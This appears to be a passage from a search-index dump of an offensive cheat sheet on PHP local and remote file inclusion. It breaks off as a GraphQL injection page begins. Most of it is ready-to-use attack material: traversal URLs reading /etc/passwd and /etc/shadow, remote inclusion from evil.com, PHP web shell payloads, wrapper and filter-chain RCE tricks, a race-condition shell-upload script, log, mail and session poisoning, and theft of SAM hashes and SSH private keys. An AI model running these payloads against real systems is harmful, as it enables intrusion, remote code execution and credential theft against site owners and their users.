CVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd\" Wrapper zip:// Create an evil payload: echo \"<pre><?php system($_GET['cmd']); ?></pre>\" > payload.php; Zip the file python zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php Wrapper data:// http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4= NOTE: the payload is \"<?php system($_GET['cmd']);echo 'Shell done !'; ?>\" Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+ Wrapper expect:// http://example.com/index.php?page=expect://id http://example.com/index.php?page=expect://ls Wrapper input:// Specify your payload in the POST parameters, this can be done with a simple curl command. curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"https://example.com/index.php?page=php://input%00\" -k -v Alternatively, Kadimus has a module to automate this attack. ./kadimus -u \"https://example.com/index.php?page=php://input%00\" -C '<?php echo shell_exec(\"id\"); ?>' -T input Wrapper phar:// Create a phar file with a serialized object in its meta-data. // create new Phar $phar = new Phar('test.phar'); $phar->startBuffering(); $phar->addFromString('test.txt', 'text'); $phar->setStub('<?php __HALT_COMPILER(); ? >'); // add object of any class as meta data class AnyClass {} $object = new AnyClass; $object->data = 'rips'; $phar->setMetadata($object); $phar->stopBuffering(); If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked class AnyClass { function __destruct() { echo $this->data; } } // output: rips include('phar://test.phar'); NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, file_exists and many more. LFI to RCE via /proc/*/fd Upload a lot of shells (for example : 100) Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too) LFI to RCE via /proc/self/environ Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1 User-Agent: <?=phpinfo(); ?> LFI to RCE via upload If you can upload a file, just inject the shell payload in it (e.g : <?php system($_GET['c']); ?> ). http://example.com/index.php?page=path/to/uploaded/file.png In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf LFI to RCE via upload (race) Worlds Quitest Let's Play\" * Upload a file and trigger a self-inclusion. * Repeat 1 a shitload of time to: * increase our odds of winning the race * increase our guessing odds * Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6} * Enjoy our shell. import itertools import requests import sys print('[+] Trying to win the race') f = {'file': open('shell.php', 'rb')} for _ in range(4096 * 4096): requests.post('http://target.com/index.php?c=index.php', f) print('[+] Bruteforcing the inclusion') for fname in itertools.combinations(string.ascii_letters + string.digits, 6): url = 'http://target.com/index.php?c=/tmp/php' + fname r = requests.get(url) if 'load average' in r.text: # <?php echo system('uptime'); print('[+] We have got a shell: ' + url) sys.exit(0) print('[x] Something went wrong, please try again') LFI to RCE via upload (FindFirstFile) :warning: Only works on Windows FindFirstFile allows using masks ( << as * and > as ? ) in LFI paths on Windows. Upload a file, it should be stored in the temp folder C:\\Windows\\Temp\\ . Include it using http://site/vuln.php?inc=c:\\windows\\temp\\php<< LFI to RCE via phpinfo() PHPinfo() displays the content of any variables such as $_GET , $_POST and $_FILES . By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name. Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py) Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf LFI to RCE via controlled log file Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file. http://example.com/index.php?page=/var/log/apache/access.log http://example.com/index.php?page=/var/log/apache/error.log http://example.com/index.php?page=/var/log/apache2/access.log http://example.com/index.php?page=/var/log/apache2/error.log http://example.com/index.php?page=/var/log/nginx/access.log http://example.com/index.php?page=/var/log/nginx/error.log http://example.com/index.php?page=/var/log/vsftpd.log http://example.com/index.php?page=/var/log/sshd.log http://example.com/index.php?page=/var/log/mail http://example.com/index.php?page=/var/log/httpd/error_log http://example.com/index.php?page=/usr/local/apache/log/error_log http://example.com/index.php?page=/usr/local/apache2/log/error_log RCE via SSH Try to ssh into the box with a PHP code as username <?php system($_GET[\"cmd\"]);?> . ssh <?php system($_GET[\"cmd\"]);?>@10.10.10.10 Then include the SSH log files inside the Web Application. http://example.com/index.php?page=/var/log/auth.log&cmd=id RCE via Mail First send an email using the open SMTP then include the log file located at http://example.com/index.php?page=/var/log/mail . root@kali:~# telnet 10.10.10.10. 25 Trying 10.10.10.10.... Connected to 10.10.10.10.. Escape character is '^]'. 220 straylight ESMTP Postfix (Debian/GNU) helo ok 250 straylight mail from: mail@example.com 250 2.1.0 Ok rcpt to: root 250 2.1.5 Ok data 354 End data with <CR><LF>.<CR><LF> subject: <?php echo system($_GET[\"cmd\"]); ?> data2 . In some cases you can also send the email with the mail command line. mail -s \"<?php system($_GET['cmd']);?>\" www-data@10.10.10.10. < /dev/null RCE via Apache logs Poison the User-Agent in access logs: $ curl http://example.org/ -A \"<?php system(\\$_GET['cmd']);?>\" Note: The logs will escape double quotes so use single quotes for strings in the PHP payload. Then request the logs via the LFI and execute your command. $ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id LFI to RCE via PHP sessions Check if the website use PHP Session (PHPSESSID) Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/ Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27. user_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\"; Set the cookie to <?php system('cat /etc/passwd');?> login=1&user=<?php system(\"cat /etc/passwd\");?>&pass=password&lang=en_us.php Use the LFI to include the PHP session file login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27 LFI to RCE via credentials files This method require high privileges inside the application in order to read the sensitive files. Windows version First extract sam and system files. http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam http://example.com/index.php?page=../../../../../../WINDOWS/repair/system Then extract hashes from these files samdump2 SYSTEM SAM > hashes.txt , and crack them with hashcat/john or replay them using the Pass The Hash technique. Linux version First extract /etc/shadow files. http://example.com/index.php?page=../../../../../../etc/shadow Then crack the hashes inside in order to login via SSH on the machine. Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. If SSH is active check which user is being used /proc/self/status and /etc/passwd and try to access /<HOME>/.ssh/id_rsa . References OWASP LFI HighOn.coffee LFI Cheat Turning LFI to RFI Is PHP vulnerable and under what conditions? Upgrade from LFI to RCE via PHP Sessions Local file inclusion tricks CVV #1: Local File Inclusion - SI9INT Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos Baby^H Master PHP 2017 by @orangetw \u0427\u0442\u0435\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u043e\u0432 => unserialize ! New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018 Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction PHP LFI with Nginx Assistance PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18 LFI2RCE via PHP Filters - HackTricks Solving \"includer's revenge\" from hxp ctf 2021 without controlling any files - @loknop","title":"File Inclusion"},{"location":"File%20Inclusion/#file-inclusion","text":"The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a \"dynamic file inclusion\" mechanisms implemented in the target application. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a \"reading\" mechanism implemented in the target application","title":"File Inclusion"},{"location":"File%20Inclusion/#summary","text":"File Inclusion Summary Tools Basic LFI Null byte Double encoding UTF-8 encoding Path and dot truncation Filter bypass tricks Basic RFI Null byte Double encoding Bypass allow_url_include LFI / RFI using wrappers Wrapper php://filter Wrapper zip:// Wrapper data:// Wrapper expect:// Wrapper input:// Wrapper phar:// LFI to RCE via /proc/*/fd LFI to RCE via /proc/self/environ LFI to RCE via upload LFI to RCE via upload (race) LFI to RCE via upload (FindFirstFile) LFI to RCE via phpinfo() LFI to RCE via controlled log file RCE via SSH RCE via Mail RCE via Apache logs LFI to RCE via PHP sessions LFI to RCE via credentials files Windows version Linux version References","title":"Summary"},{"location":"File%20Inclusion/#tools","text":"Kadimus - https://github.com/P0cL4bs/Kadimus LFISuite - https://github.com/D35m0nd142/LFISuite fimap - https://github.com/kurobeats/fimap panoptic - https://github.com/lightos/Panoptic","title":"Tools"},{"location":"File%20Inclusion/#basic-lfi","text":"In the following examples we include the /etc/passwd file, check the Directory & Path Traversal chapter for more interesting files. http://example.com/index.php?page=../../../etc/passwd","title":"Basic LFI"},{"location":"File%20Inclusion/#null-byte","text":":warning: In versions of PHP below 5.3.4 we can terminate with null byte. http://example.com/index.php?page=../../../etc/passwd%00","title":"Null byte"},{"location":"File%20Inclusion/#double-encoding","text":"http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00","title":"Double encoding"},{"location":"File%20Inclusion/#utf-8-encoding","text":"http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00","title":"UTF-8 encoding"},{"location":"File%20Inclusion/#path-and-dot-truncation","text":"On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away. http://example.com/index.php?page=../../../etc/passwd............[ADD MORE] http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE] http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd","title":"Path and dot truncation"},{"location":"File%20Inclusion/#filter-bypass-tricks","text":"http://example.com/index.php?page=....//....//etc/passwd http://example.com/index.php?page=..///////..////..//////etc/passwd http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd","title":"Filter bypass tricks"},{"location":"File%20Inclusion/#basic-rfi","text":"Most of the filter bypasses from LFI section can be reused for RFI. http://example.com/index.php?page=http://evil.com/shell.txt","title":"Basic RFI"},{"location":"File%20Inclusion/#null-byte_1","text":"http://example.com/index.php?page=http://evil.com/shell.txt%00","title":"Null byte"},{"location":"File%20Inclusion/#double-encoding_1","text":"http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt","title":"Double encoding"},{"location":"File%20Inclusion/#bypass-allow_url_include","text":"When allow_url_include and allow_url_fopen are set to Off . It is still possible to include a remote file on Windows box using the smb protocol. Create a share open to everyone Write a PHP code inside a file : shell.php Include it http://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php","title":"Bypass allow_url_include"},{"location":"File%20Inclusion/#lfi-rfi-using-wrappers","text":"","title":"LFI / RFI using wrappers"},{"location":"File%20Inclusion/#wrapper-phpfilter","text":"The part \"php://filter\" is case insensitive http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php Wrappers can be chained with a compression wrapper for large files. http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd NOTE: Wrappers can be chained multiple times using | or / : - Multiple base64 decodes: php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s - deflate then base64encode (useful for limited character exfil): php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php ./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter page curl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d > index.php Also there is a way to turn the php://filter into a full RCE. Use LFI2RCE.py to generate a custom payload. # vulnerable file: index.php # vulnerable parameter: file # executed command: id # executed PHP code: <?=`$_GET[0]`;;?> curl \"127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd\"","title":"Wrapper php://filter"},{"location":"File%20Inclusion/#wrapper-zip","text":"Create an evil payload: echo \"<pre><?php system($_GET['cmd']); ?></pre>\" > payload.php; Zip the file python zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php","title":"Wrapper zip://"},{"location":"File%20Inclusion/#wrapper-data","text":"http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4= NOTE: the payload is \"<?php system($_GET['cmd']);echo 'Shell done !'; ?>\" Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+","title":"Wrapper data://"},{"location":"File%20Inclusion/#wrapper-expect","text":"http://example.com/index.php?page=expect://id http://example.com/index.php?page=expect://ls","title":"Wrapper expect://"},{"location":"File%20Inclusion/#wrapper-input","text":"Specify your payload in the POST parameters, this can be done with a simple curl command. curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"https://example.com/index.php?page=php://input%00\" -k -v Alternatively, Kadimus has a module to automate this attack. ./kadimus -u \"https://example.com/index.php?page=php://input%00\" -C '<?php echo shell_exec(\"id\"); ?>' -T input","title":"Wrapper input://"},{"location":"File%20Inclusion/#wrapper-phar","text":"Create a phar file with a serialized object in its meta-data. // create new Phar $phar = new Phar('test.phar'); $phar->startBuffering(); $phar->addFromString('test.txt', 'text'); $phar->setStub('<?php __HALT_COMPILER(); ? >'); // add object of any class as meta data class AnyClass {} $object = new AnyClass; $object->data = 'rips'; $phar->setMetadata($object); $phar->stopBuffering(); If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked class AnyClass { function __destruct() { echo $this->data; } } // output: rips include('phar://test.phar'); NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, file_exists and many more.","title":"Wrapper phar://"},{"location":"File%20Inclusion/#lfi-to-rce-via-procfd","text":"Upload a lot of shells (for example : 100) Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)","title":"LFI to RCE via /proc/*/fd"},{"location":"File%20Inclusion/#lfi-to-rce-via-procselfenviron","text":"Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1 User-Agent: <?=phpinfo(); ?>","title":"LFI to RCE via /proc/self/environ"},{"location":"File%20Inclusion/#lfi-to-rce-via-upload","text":"If you can upload a file, just inject the shell payload in it (e.g : <?php system($_GET['c']); ?> ). http://example.com/index.php?page=path/to/uploaded/file.png In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf","title":"LFI to RCE via upload"},{"location":"File%20Inclusion/#lfi-to-rce-via-upload-race","text":"Worlds Quitest Let's Play\" * Upload a file and trigger a self-inclusion. * Repeat 1 a shitload of time to: * increase our odds of winning the race * increase our guessing odds * Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6} * Enjoy our shell. import itertools import requests import sys print('[+] Trying to win the race') f = {'file': open('shell.php', 'rb')} for _ in range(4096 * 4096): requests.post('http://target.com/index.php?c=index.php', f) print('[+] Bruteforcing the inclusion') for fname in itertools.combinations(string.ascii_letters + string.digits, 6): url = 'http://target.com/index.php?c=/tmp/php' + fname r = requests.get(url) if 'load average' in r.text: # <?php echo system('uptime'); print('[+] We have got a shell: ' + url) sys.exit(0) print('[x] Something went wrong, please try again')","title":"LFI to RCE via upload (race)"},{"location":"File%20Inclusion/#lfi-to-rce-via-upload-findfirstfile","text":":warning: Only works on Windows FindFirstFile allows using masks ( << as * and > as ? ) in LFI paths on Windows. Upload a file, it should be stored in the temp folder C:\\Windows\\Temp\\ . Include it using http://site/vuln.php?inc=c:\\windows\\temp\\php<<","title":"LFI to RCE via upload (FindFirstFile)"},{"location":"File%20Inclusion/#lfi-to-rce-via-phpinfo","text":"PHPinfo() displays the content of any variables such as $_GET , $_POST and $_FILES . By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name. Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py) Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf","title":"LFI to RCE via phpinfo()"},{"location":"File%20Inclusion/#lfi-to-rce-via-controlled-log-file","text":"Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file. http://example.com/index.php?page=/var/log/apache/access.log http://example.com/index.php?page=/var/log/apache/error.log http://example.com/index.php?page=/var/log/apache2/access.log http://example.com/index.php?page=/var/log/apache2/error.log http://example.com/index.php?page=/var/log/nginx/access.log http://example.com/index.php?page=/var/log/nginx/error.log http://example.com/index.php?page=/var/log/vsftpd.log http://example.com/index.php?page=/var/log/sshd.log http://example.com/index.php?page=/var/log/mail http://example.com/index.php?page=/var/log/httpd/error_log http://example.com/index.php?page=/usr/local/apache/log/error_log http://example.com/index.php?page=/usr/local/apache2/log/error_log","title":"LFI to RCE via controlled log file"},{"location":"File%20Inclusion/#rce-via-ssh","text":"Try to ssh into the box with a PHP code as username <?php system($_GET[\"cmd\"]);?> . ssh <?php system($_GET[\"cmd\"]);?>@10.10.10.10 Then include the SSH log files inside the Web Application. http://example.com/index.php?page=/var/log/auth.log&cmd=id","title":"RCE via SSH"},{"location":"File%20Inclusion/#rce-via-mail","text":"First send an email using the open SMTP then include the log file located at http://example.com/index.php?page=/var/log/mail . root@kali:~# telnet 10.10.10.10. 25 Trying 10.10.10.10.... Connected to 10.10.10.10.. Escape character is '^]'. 220 straylight ESMTP Postfix (Debian/GNU) helo ok 250 straylight mail from: mail@example.com 250 2.1.0 Ok rcpt to: root 250 2.1.5 Ok data 354 End data with <CR><LF>.<CR><LF> subject: <?php echo system($_GET[\"cmd\"]); ?> data2 . In some cases you can also send the email with the mail command line. mail -s \"<?php system($_GET['cmd']);?>\" www-data@10.10.10.10. < /dev/null","title":"RCE via Mail"},{"location":"File%20Inclusion/#rce-via-apache-logs","text":"Poison the User-Agent in access logs: $ curl http://example.org/ -A \"<?php system(\\$_GET['cmd']);?>\" Note: The logs will escape double quotes so use single quotes for strings in the PHP payload. Then request the logs via the LFI and execute your command. $ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id","title":"RCE via Apache logs"},{"location":"File%20Inclusion/#lfi-to-rce-via-php-sessions","text":"Check if the website use PHP Session (PHPSESSID) Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/ Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27. user_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\"; Set the cookie to <?php system('cat /etc/passwd');?> login=1&user=<?php system(\"cat /etc/passwd\");?>&pass=password&lang=en_us.php Use the LFI to include the PHP session file login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27","title":"LFI to RCE via PHP sessions"},{"location":"File%20Inclusion/#lfi-to-rce-via-credentials-files","text":"This method require high privileges inside the application in order to read the sensitive files.","title":"LFI to RCE via credentials files"},{"location":"File%20Inclusion/#windows-version","text":"First extract sam and system files. http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam http://example.com/index.php?page=../../../../../../WINDOWS/repair/system Then extract hashes from these files samdump2 SYSTEM SAM > hashes.txt , and crack them with hashcat/john or replay them using the Pass The Hash technique.","title":"Windows version"},{"location":"File%20Inclusion/#linux-version","text":"First extract /etc/shadow files. http://example.com/index.php?page=../../../../../../etc/shadow Then crack the hashes inside in order to login via SSH on the machine. Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. If SSH is active check which user is being used /proc/self/status and /etc/passwd and try to access /<HOME>/.ssh/id_rsa .","title":"Linux version"},{"location":"File%20Inclusion/#references","text":"OWASP LFI HighOn.coffee LFI Cheat Turning LFI to RFI Is PHP vulnerable and under what conditions? Upgrade from LFI to RCE via PHP Sessions Local file inclusion tricks CVV #1: Local File Inclusion - SI9INT Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos Baby^H Master PHP 2017 by @orangetw \u0427\u0442\u0435\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u043e\u0432 => unserialize ! New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018 Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction PHP LFI with Nginx Assistance PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18 LFI2RCE via PHP Filters - HackTricks Solving \"includer's revenge\" from hxp ctf 2021 without controlling any files - @loknop","title":"References"},{"location":"GraphQL%20Injection/","text":"GraphQL injection GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type Summary GraphQL injection Summary Tools Exploit Identify an injection point Enumerate Database Schema via Introspection List path Extract data Extract data using edges/nodes Extract data using projections Enumerate the types' definition Use mutations NOSQL injection SQL injection GraphQL Batching Attacks References Tools GraphQLmap - Scripting engine to interact with a graphql endpoint for pentesting purposes GraphQL-voyager - Represent any GraphQL API as an interactive graph GraphQL Security Toolkit - GraphQL Security Research Material Graphql-path-enum - Lists the different ways of reaching a given type in a GraphQL schema GraphQL IDE - An extensive IDE for exploring GraphQL API's ClairvoyanceX - Obtain GraphQL API schema despite disabled introspection InQL - A Burp Extension for GraphQL Security Testing Insomnia - Cross-platform HTTP and GraphQL Client AutoGraphql + introspection Exploit Identify an injection point Most of the time the graphql is located on the /graphql or /graphiql endpoint. example.com/graphql?query={__schema{types{name}}} example.com/graphiql?query={__schema{types{name}}} Check if errors are visible. ?query={__schema} ?query={} ?query={thisdefinitelydoesnotexist} Enumerate Database Schema via Introspection URL encoded query to dump the database schema. fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{+++